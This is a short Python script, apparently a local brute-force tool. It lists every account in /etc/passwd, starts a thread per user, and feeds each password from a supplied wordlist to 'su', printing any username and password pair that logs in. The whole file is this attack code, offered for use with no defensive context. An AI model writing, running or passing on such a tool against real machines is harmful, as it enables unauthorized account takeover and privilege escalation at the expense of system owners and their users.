import subprocess
import sys
from threading import Thread

def get_all_users():
    try:
        output = subprocess.check_output(['cut', '-d:', '-f1', '/etc/passwd'])
        users = output.decode().splitlines()
        return users
    except subprocess.CalledProcessError as e:
        print("Error to get users in /etc/passwd:", e)
        return []

def login(username, password):
    try:
        subprocess.run(['su', username], input=password.encode(), check=True, stderr=subprocess.DEVNULL)
        print("[!] Success to {username}:{password}".format(username=username,password=password))
    except subprocess.CalledProcessError as e:
        pass

def try_login(user, passwords):
    for password in passwords:
        login(user, password.strip())

if __name__ == "__main__":
    all_users = get_all_users()
    wordlist = open(sys.argv[1]).readlines()
    
    threads = []
    for user in all_users:
        t = Thread(target=try_login, args=(user, wordlist))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
